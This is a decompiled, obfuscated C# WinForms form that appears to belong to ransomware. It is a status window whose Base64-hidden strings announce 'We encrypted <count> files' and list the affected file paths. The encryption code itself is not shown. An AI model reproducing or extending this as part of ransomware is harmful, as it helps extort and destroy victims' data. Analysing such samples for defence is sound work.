using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

namespace ns0;

public class GForm0 : Form
{
	public List<string> list_0 = new List<string>();

	private IContainer icontainer_0 = null;

	private Label label_0;

	private ListBox listBox_0;

	private Timer timer_0;

	public GForm0()
	{
		method_0();
	}

	private void GForm0_Load(object sender, EventArgs e)
	{
		list_0 = new List<string>();
	}

	private void timer_0_Tick(object sender, EventArgs e)
	{
		try
		{
			((Control)label_0).set_Text(Encoding.UTF8.GetString(Convert.FromBase64String("V2UgZW5jcnlwdGVkIDxjb3VudD4gZmlsZXMu")).Replace(Encoding.UTF8.GetString(Convert.FromBase64String("PGNvdW50Pg==")), GClass0.list_0.Count.ToString() ?? Encoding.UTF8.GetString(Convert.FromBase64String(""))));
			foreach (string item in GClass0.list_0)
			{
				if (!list_0.Contains(item) && !listBox_0.get_Items().Contains((object)item))
				{
					listBox_0.get_Items().Add((object)item);
					list_0.Add(item);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	protected override void vmethod_0(bool bool_0)
	{
		if (bool_0 && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(bool_0);
	}

	private void method_0()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_0070: Expected O, but got Unknown
		icontainer_0 = new Container();
		label_0 = new Label();
		listBox_0 = new ListBox();
		timer_0 = new Timer(icontainer_0);
		((Control)this).SuspendLayout();
		((Control)label_0).set_AutoSize(true);
		((Control)label_0).set_Font(new Font(Encoding.UTF8.GetString(Convert.FromBase64String("U2Vnb2UgVUk=")), 20.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label_0).set_Location(new Point(12, 24));
		((Control)label_0).set_Name(Encoding.UTF8.GetString(Convert.FromBase64String("bGFiZWwx")));
		((Control)label_0).set_Size(new Size(350, 37));
		((Control)label_0).set_TabIndex(0);
		((Control)label_0).set_Text(Encoding.UTF8.GetString(Convert.FromBase64String("V2UgZW5jcnlwdGVkIDxjb3VudD4gZmlsZXMu")));
		((Control)listBox_0).set_BackColor(Color.FromArgb(32, 32, 32));
		((Control)listBox_0).set_ForeColor(Color.White);
		((ListControl)listBox_0).set_FormattingEnabled(true);
		((Control)listBox_0).set_Location(new Point(12, 83));
		((Control)listBox_0).set_Name(Encoding.UTF8.GetString(Convert.FromBase64String("bGlzdEJveDE=")));
		((Control)listBox_0).set_Size(new Size(797, 316));
		((Control)listBox_0).set_TabIndex(1);
		timer_0.set_Enabled(true);
		timer_0.set_Interval(1);
		timer_0.add_Tick((EventHandler)timer_0_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(32, 32, 32));
		((Form)this).set_ClientSize(new Size(821, 440));
		((Control)this).get_Controls().Add((Control)(object)listBox_0);
		((Control)this).get_Controls().Add((Control)(object)label_0);
		((Control)this).set_ForeColor(Color.White);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name(Encoding.UTF8.GetString(Convert.FromBase64String("RW5jckZpbGVz")));
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text(Encoding.UTF8.GetString(Convert.FromBase64String("V2hhdCBmaWxlcyBoYXZlIGJlZW4gZW5jcnlwdGVk")));
		((Form)this).add_Load((EventHandler)GForm0_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
